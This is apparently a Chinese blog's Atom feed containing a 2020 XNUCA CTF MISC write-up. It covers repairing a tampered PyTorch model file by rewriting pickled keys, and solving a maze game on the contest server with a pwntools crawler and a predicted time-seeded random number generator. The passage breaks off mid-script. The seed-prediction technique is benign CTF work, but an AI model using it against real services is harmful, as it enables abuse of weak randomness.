<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>汐白的学习档案</title>
  
  <subtitle>小萌新一枚QAQ</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://xibai.xyz/"/>
  <updated>2020-11-02T04:30:51.358Z</updated>
  <id>http://xibai.xyz/</id>
  
  <author>
    <name>Ximu</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>最近更新</title>
    <link href="http://xibai.xyz/2020/11/02/recently/"/>
    <id>http://xibai.xyz/2020/11/02/recently/</id>
    <published>2020-11-02T15:15:11.000Z</published>
    <updated>2020-11-02T04:30:51.358Z</updated>
    
    <content type="html"><![CDATA[<h2 id="这里列出最近半个月有更新过的内容"><a href="#这里列出最近半个月有更新过的内容" class="headerlink" title="这里列出最近半个月有更新过的内容"></a>这里列出最近半个月有更新过的内容</h2><h3 id="10-31"><a href="#10-31" class="headerlink" title="10.31"></a>10.31</h3><h4 id="2020-XNUCA-Writeup-MISC"><a href="#2020-XNUCA-Writeup-MISC" class="headerlink" title="2020-XNUCA Writeup(MISC)"></a><a href="http://xibai.xyz/2020/11/01/2020XNUCA/">2020-XNUCA Writeup(MISC)</a></h4>]]></content>
    
    <summary type="html">
    
      
      
        
        
          
        
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>2020-XNUCA Writeup(MISC)</title>
    <link href="http://xibai.xyz/2020/11/01/2020XNUCA/"/>
    <id>http://xibai.xyz/2020/11/01/2020XNUCA/</id>
    <published>2020-11-01T13:14:30.022Z</published>
    <updated>2020-11-02T04:30:23.251Z</updated>
    
    <content type="html"><![CDATA[<p>pg: 题目还行，感觉做的时候挺有意思的，就是自己做题时太憨憨导致全部错失一血呜呜呜<del>~</del></p><h2 id="torch-model"><a href="#torch-model" class="headerlink" title="torch model"></a>torch model</h2><p>题目要求环境: python==3.7.7 、torch == 1.5.0</p><p>给了一个神经网络学习的模型训练python脚本(<code>ipynb</code>格式)，直接vscode打开可以自动装相关环境一键查看，vscode还是香的。</p><p>查看ipynb可以知道该模型的作用是识别题目给出的图片为<code>flag</code>，<code>flag</code>长度和<code>sha256</code>已知。模型数据被保存为<code>model_state_dict.pt</code>，并且中间有一段数据用随机数据进行了覆盖修改，查看题目给出的<code>diff.png</code>以及<code>torch.save</code>的源码可知：修改了<code>torch</code>中<strong>保存模型数据信息的数据段</strong>，而且将<strong>模型数据字典中的键值名乱序保存进文件</strong>。pt文件中的数据用<code>pickle</code>打包。</p><p>至此题目信息查看完毕，题目解法为修复pt文件数据，用torch读取模型识别flag。<br>这里我们用两个同长度的字符串代替原flag，重新训练两个模型，并将其保存为两个正常的pt文件。然后<strong>对比两个pt文件保存模型数据信息数据段的十六进制</strong>，发现除了<code>serialized_storage_keys</code>的<code>key</code>的信息，其余结构基本一致。所以修复只需要将其中的<code>key</code>的键值名替换为题目文件中的<code>key</code>的键值名。对比图如下：</p><p><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimages20201102012727.png" alt="20201102012727"></p><p>提取题目模型文件和我们刚保存的模型文件中的<code>serialized_storage_keys</code>数据，并解包替换重新打包写回文件，脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">"./model_state_dict.pt"</span>,<span class="string">'rb'</span>) <span class="keyword">as</span> model1:</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"./model_state_dict_test.pt"</span>,<span class="string">'rb'</span>) <span class="keyword">as</span> model2:</span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">"./model_state_dict_flag.pt"</span>,<span class="string">'wb'</span>) <span class="keyword">as</span> model3:</span><br><span class="line">            model3.write(model1.read(<span class="number">0x89</span>))</span><br><span class="line">            model2.read(<span class="number">0x89</span>)</span><br><span class="line">            tmp_flag_obj = model1.read(<span class="number">0x4ef</span><span class="number">-0x89</span>)</span><br><span class="line">            tmp_test_obj = model2.read(<span class="number">0x4e5</span><span class="number">-0x89</span>)</span><br><span class="line">            tmp_flag_keys = model1.read(<span class="number">0x5c9</span><span class="number">-0x4ef</span>)</span><br><span class="line">            tmp_test_keys = model2.read(<span class="number">0x5b5</span><span class="number">-0x4e5</span>)</span><br><span class="line">            tmp1 = pickle.loads(tmp_flag_keys,encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">            tmp2 = pickle.loads(tmp_test_keys,encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">            print(tmp1)</span><br><span class="line">            print(tmp2)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(len(tmp1)):</span><br><span class="line">                tmp_test_obj = tmp_test_obj.replace(bytes(tmp2[i],encoding=<span class="string">'utf-8'</span>),bytes(tmp1[i],encoding=<span class="string">'utf-8'</span>))</span><br><span class="line"></span><br><span class="line">            model3.write(tmp_test_obj)</span><br><span class="line">            model3.write(tmp_flag_keys)</span><br><span class="line"></span><br><span class="line">            tmp = model1.read(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">while</span> tmp != <span class="string">b''</span>:</span><br><span class="line">                model3.write(tmp)</span><br><span class="line">                tmp = model1.read(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>接下来是踩坑时刻。用此脚本复现该题目的话会发现修复之后的pt文件依旧不能被加载。</p><p>注意看脚本可以发现，pt文件数据虽然全是用pickle打包的，但是对于模型的<code>obj</code>数据却没有选择解包替换，而是直接对被打包的数据进行了“带包”替换。这里如果有仔细分析<code>torch.save</code>的源码的话，就会知道，官方对于obj的数据自定义了一套pickler检查规则，这里是因为结构信息几乎完全一致，所以就没有去读官方定义的那套规则。不过这样的话就需要注意修改<code>obj</code>集合数据中打包的小结构体的一个关键数据：</p><p><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimages20201102014247.png" alt="20201102014247"></p><p>图中选中部分是为一个被打包的小结构体，每一个小结构体都是<code>obj</code>集合中的一个对象。结构体的<code>magic header</code>是单个字节的十六进制<code>\x71</code>,其后紧跟着的一个字节是这个结构体在<code>obj</code>集合中的顺序序号，上图选中的即为<code>\x2e</code>第46个结构体。这里注意下下图红色标记字节，从该字节开始的四个字节为<code>pickle</code>打包数据中一个集合内相关对象的名字的长度，小端序。这里是<code>\x0D\x00\x00\x00</code>，即长度为13，但是13其实是我生成新模型数据文件时新模型内的<code>key</code>的名字长度，如果去观察偏移<code>\x4ef</code>后的题目模型文件的<code>key</code>数据，会发现这些<code>9452xxxx</code>的键值名称长度其实都为14，这里因为数量较少，所以我手动修复了。此时pt文件中的模型关键信息已经修复完毕，torch已经可以解析加载pt文件。<br>(pg:这个长度不一样就离谱，第一天下午看题的时候一个下午都没发现自己把14数成13，结果别的师傅都把题刷烂了自己还纳闷题目文件为啥比自己生成的文件大了20字节，一直以为环境没配好反复配了几个小时环境，惨惨emmm)</p><p><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimages20201102014936.png" alt="20201102014936"></p><p>但是，还记得<strong>题目图片中的random</strong>嘛，这个东西还没用呢，还有坑。此时直接加载模型会发现如下报错：</p><p><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimages20201102015948.png" alt="20201102015948"></p><p>这里就是乱序储存导致<code>torch</code>在<code>load</code>模型训练数据时，<code>serialized_storage_keys</code>中的每个键值对应的那一部分模型数据长度与现在实际<code>load</code>解析得到的长度不一致导致的，这里它直接给出了应该是什么长度的键值。</p><blockquote><p>RuntimeError: storage has wrong size: expected 120 got 10</p></blockquote><p>120即为第一部分的长度，但此时第一个键值对应长度为十，这里可以直接去<code>torch.load</code>的源码那里，用一个<code>print</code>输出它解析到的<code>obj</code>信息，从而得到每个数字键值名对应的对象的数据长度，然后将pt文件中<code>\x4ef</code>偏移后的<code>keys</code>集合数据重新排序复写，这里给出脚本，因为就十条，所以没搞自动化嘤嘤嘤QAQ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">"./model_state_dict_flag.pt"</span>,<span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"./tmp.pt"</span>,<span class="string">'wb'</span>) <span class="keyword">as</span> o:</span><br><span class="line">        o.write(f.read(<span class="number">0x4ef</span>))</span><br><span class="line">        tmp = f.read(<span class="number">0x5c9</span><span class="number">-0x4ef</span>)</span><br><span class="line">        tmp = pickle.loads(tmp,encoding=<span class="string">"utf-8"</span>)</span><br><span class="line">        tmp = sorted(tmp)</span><br><span class="line">        tmp.remove(<span class="string">'94521743421392'</span>)</span><br><span class="line">        tmp.insert(<span class="number">0</span>,<span class="string">'94521743421392'</span>)</span><br><span class="line">        tmp.remove(<span class="string">'94521743421488'</span>)</span><br><span class="line">        tmp.insert(<span class="number">1</span>,<span class="string">'94521743421488'</span>)</span><br><span class="line">        tmp.remove(<span class="string">'94521743257408'</span>)</span><br><span class="line">        tmp.insert(<span class="number">2</span>,<span class="string">'94521743257408'</span>)</span><br><span class="line">        tmp.remove(<span class="string">'94521743706048'</span>)</span><br><span class="line">        tmp.insert(<span class="number">3</span>,<span class="string">'94521743706048'</span>)</span><br><span class="line">        tmp.remove(<span class="string">'94521742563680'</span>)</span><br><span class="line">        tmp.insert(<span class="number">4</span>,<span class="string">'94521742563680'</span>)</span><br><span class="line">        tmp.remove(<span class="string">'94521716638368'</span>)</span><br><span class="line">        tmp.insert(<span class="number">5</span>,<span class="string">'94521716638368'</span>)</span><br><span class="line">        tmp.remove(<span class="string">'94521743430240'</span>)</span><br><span class="line">        tmp.insert(<span class="number">6</span>,<span class="string">'94521743430240'</span>)</span><br><span class="line">        tmp.remove(<span class="string">'94521743916656'</span>)</span><br><span class="line">        tmp.insert(<span class="number">7</span>,<span class="string">'94521743916656'</span>)</span><br><span class="line"></span><br><span class="line">        tmp = pickle.dumps(tmp)</span><br><span class="line">        o.write(tmp)</span><br><span class="line">        tmp = f.read(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">while</span> tmp != <span class="string">b''</span>:</span><br><span class="line">            o.write(tmp)</span><br><span class="line">            tmp = f.read(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>至此，pt文件彻底修复，直接load然后加载图片即可获取flag</p><h2 id="catchthecat"><a href="#catchthecat" class="headerlink" title="catchthecat"></a>catchthecat</h2><p>考察数据结构算法。（ps：千万别乱找网上的轮子！自己造的真香！）<br>两个脚本解决，第一个遍历迷宫获取迷宫地图，第二个求迷宫两点最短路径（此处顺便还要看点运气emmm）</p><p>首先题目源码给出，根据源码可知地图除了墙还有炸弹，遇见炸弹直接game over。所以写探索迷宫的算法时要考虑到重连问题。这里我用pwntools + 深度优先算法遍历迷宫数据。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">NOTHING = <span class="number">0</span></span><br><span class="line">WALL = <span class="number">1</span></span><br><span class="line">BOMB = <span class="number">2</span></span><br><span class="line">CAT = <span class="number">3</span></span><br><span class="line">PERSON = <span class="number">4</span></span><br><span class="line">directions = [<span class="string">'u'</span>, <span class="string">'d'</span>, <span class="string">'l'</span>, <span class="string">'r'</span>]</span><br><span class="line">dic = &#123;<span class="string">'u'</span>:<span class="string">'d'</span>,<span class="string">'d'</span>:<span class="string">'u'</span>,<span class="string">'r'</span>:<span class="string">'l'</span>,<span class="string">'l'</span>:<span class="string">'r'</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在迷宫中判断下一个节点是否可以去或者探索未知节点</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">turn</span><span class="params">(game,map,direction,x,y)</span>:</span></span><br><span class="line"></span><br><span class="line">    status = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> direction == <span class="string">"u"</span>:</span><br><span class="line">        tmp_x = x - <span class="number">1</span></span><br><span class="line">        tmp_y = y</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> direction == <span class="string">"d"</span>:</span><br><span class="line">        <span class="keyword">if</span> x == len(map) - <span class="number">1</span>:</span><br><span class="line">            map.append([<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(len(map[<span class="number">0</span>]))])</span><br><span class="line">        tmp_x = x + <span class="number">1</span></span><br><span class="line">        tmp_y = y</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> direction == <span class="string">'l'</span>:</span><br><span class="line">        tmp_y = y - <span class="number">1</span></span><br><span class="line">        tmp_x = x</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> y == len(map[<span class="number">0</span>]) <span class="number">-1</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> map:</span><br><span class="line">                i.append(<span class="number">0</span>)</span><br><span class="line">        tmp_x = x</span><br><span class="line">        tmp_y = y + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> map[tmp_x][tmp_y] == NOTHING:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            game.sendline(direction)</span><br><span class="line">            sleep(<span class="number">0.1</span>)</span><br><span class="line">            infor = game.recv(timeout = <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">"recvError!!!"</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"WALL"</span> <span class="keyword">in</span> infor:</span><br><span class="line">            map[tmp_x][tmp_y] = WALL</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">"BOMB"</span> <span class="keyword">in</span> infor:</span><br><span class="line">            map[tmp_x][tmp_y] = BOMB</span><br><span class="line">            x = tmp_x</span><br><span class="line">            y = tmp_y</span><br><span class="line">            status = <span class="string">"BOOM"</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">"Caught"</span> <span class="keyword">in</span> infor <span class="keyword">or</span> <span class="string">"OK"</span> <span class="keyword">in</span> infor:</span><br><span class="line">            map[tmp_x][tmp_y] = NOTHING</span><br><span class="line">            x = tmp_x</span><br><span class="line">            y = tmp_y</span><br><span class="line">            status = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"error or flag: "</span>,infor)</span><br><span class="line">            pause()</span><br><span class="line">        <span class="keyword">return</span> map,x,y,status</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> map[tmp_x][tmp_y] == WALL:</span><br><span class="line">        <span class="keyword">return</span> map,x,y,status</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> map[tmp_x][tmp_y] == BOMB:</span><br><span class="line">        <span class="keyword">return</span> map,x,y,status</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"ukown"</span>,map[tmp_x][tmpp_y],tmp_x,tmp_y)</span><br><span class="line">        <span class="keyword">return</span> map,x,y,status</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string"># 加载已保存的地图数据 与 初始化地图 二选一</span></span><br><span class="line"><span class="string">map = [[] for i in range(60)]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">pic = Image.open('./map.png')</span></span><br><span class="line"><span class="string">w,h = pic.size</span></span><br><span class="line"><span class="string">for i in range(h):</span></span><br><span class="line"><span class="string">    for j in range(w):</span></span><br><span class="line"><span class="string">        pixel = pic.getpixel((j,i))</span></span><br><span class="line"><span class="string">        if pixel == (0,0,0) or pixel == (255,0,0):</span></span><br><span class="line"><span class="string">            map[i].append(WALL)</span></span><br><span class="line"><span class="string">        else:</span></span><br><span class="line"><span class="string">            map[i].append(NOTHING)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="comment"># 初始化迷宫地图 与 加载保存一半的地图信息 二选一</span></span><br><span class="line">map = [[<span class="number">1</span>,<span class="number">1</span>],[<span class="number">1</span>,<span class="number">0</span>]]</span><br><span class="line"><span class="comment"># 初始化栈</span></span><br><span class="line">stack = [[<span class="number">1</span>,<span class="number">1</span>,[<span class="string">'r'</span>,<span class="string">'d'</span>],]]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    game = remote(<span class="string">"59.110.63.160"</span>, <span class="number">40001</span>)</span><br><span class="line"></span><br><span class="line">    x,y = <span class="number">1</span>,<span class="number">1</span> ; exit = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> stack:</span><br><span class="line">            pos = stack[<span class="number">-1</span>]</span><br><span class="line">            <span class="keyword">if</span> [x,y] == pos[:<span class="number">2</span>]:</span><br><span class="line">                tmp_directions = []</span><br><span class="line">                tmp_directions.extend(pos[<span class="number">2</span>])</span><br><span class="line">                <span class="keyword">for</span> direction <span class="keyword">in</span> pos[<span class="number">2</span>]:</span><br><span class="line">                    map,tmp_x,tmp_y,status = turn(game,map,direction,x,y)</span><br><span class="line">                    tmp_directions.remove(direction)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> status == <span class="literal">True</span>:</span><br><span class="line">                        x,y = tmp_x,tmp_y</span><br><span class="line">                        stack[<span class="number">-1</span>][<span class="number">2</span>] = tmp_directions</span><br><span class="line">                        tmp = []</span><br><span class="line">                        tmp.extend(directions)</span><br><span class="line">                        tmp.remove(dic[direction])</span><br><span class="line">                        stack.extend([[x,y,tmp,dic[direction]]])</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                    <span class="keyword">if</span> status == <span class="string">"BOOM"</span>:</span><br><span class="line">                        x,y = tmp_x,tmp_y</span><br><span class="line">                        stack[<span class="number">-1</span>][<span class="number">2</span>] = tmp_directions</span><br><span class="line">                        <span class="keyword">raise</span> Exception(<span class="string">"BOOM!!!"</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    map,x,y,status = turn(game,map,pos[<span class="number">-1</span>],x,y)</span><br><span class="line">                    stack.pop()</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 重连之后走回到上次遇见炸弹前的节点</span></span><br><span class="line">            <span class="keyword">elif</span> [x,y] == [<span class="number">1</span>,<span class="number">1</span>]:</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> stack[<span class="number">1</span>:]:</span><br><span class="line">                    map,x,y,status = turn(game,map,dic[i[<span class="number">3</span>]],x,y)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">"ukown: "</span>,[x,y])</span><br><span class="line">                pause()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            exit = <span class="number">1</span></span><br><span class="line">    <span class="keyword">except</span> Exception,err:</span><br><span class="line">        game.close()</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        <span class="comment"># 保存迷宫地图信息</span></span><br><span class="line">        img = Image.new(<span class="string">"RGB"</span>,(len(map[<span class="number">0</span>]),len(map)))</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(map)):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(len(map[<span class="number">0</span>])):</span><br><span class="line">                <span class="keyword">if</span> map[i][j] == <span class="number">0</span>:</span><br><span class="line">                    img.putpixel((j,i),(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line">                <span class="keyword">elif</span> map[i][j] == <span class="number">1</span>:</span><br><span class="line">                    img.putpixel((j,i),<span class="number">0</span>)</span><br><span class="line">                <span class="keyword">elif</span> map[i][j] == <span class="number">2</span>:</span><br><span class="line">                    img.putpixel((j,i),(<span class="number">255</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">pass</span></span><br><span class="line">        print(img.size)</span><br><span class="line">        img.save(<span class="string">"map_1.png"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> exit == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimagesmap_1.png" alt="map_1"></p><p>遍历出地图之后，利用题目源码写抓猫算法。（ps：就是本地模拟服务器程序运行状态，random的seed是由连接题目程序时的时间决定的，seed已知，本地模拟服务器状态，深度优先求解<code>PERSON</code>与<code>CAT</code>的最短路径，这里因为嫌麻烦不想再该刚刚遍历地图的脚本了就选择了去网上找个现成的轮子，结果拿回来各种调试修bug，一个下午又被浪费了emmm 最后恼羞成怒又写了个轮子哭唧唧）</p><p>另外，出题人的服务器就离谱！！！此处疯狂diss出题人，第一天晚上做题的时候刚开始做就发现题目挂了，被迫睡大觉，第二天题目好了，但是服务器的时区延时是认真的么，不给时区信息的同时，服务器本地时间还比北京时间快了整整两秒！！！</p><p>其实本来网上的轮子也没啥，它的问题就那么一丢，本体调试几遍就能用了，但是跑flag的时候和服务器的输出一直对不上，结果一直在调试脚本找本地的bug，结果最后才知道本地已经完美了，数据对不上是服务器的<code>seed</code>比本地延时了2s！！！淦！ping服务器，响应延迟只有不到20ms，当时因为想着出题人没给提示应该是默认北京时区互联网时间，所以做多也就试了把本地模拟服务器的时间种子值加1，依旧不对。最后突然试了下加2对了。不说了，我是fw TAT</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span 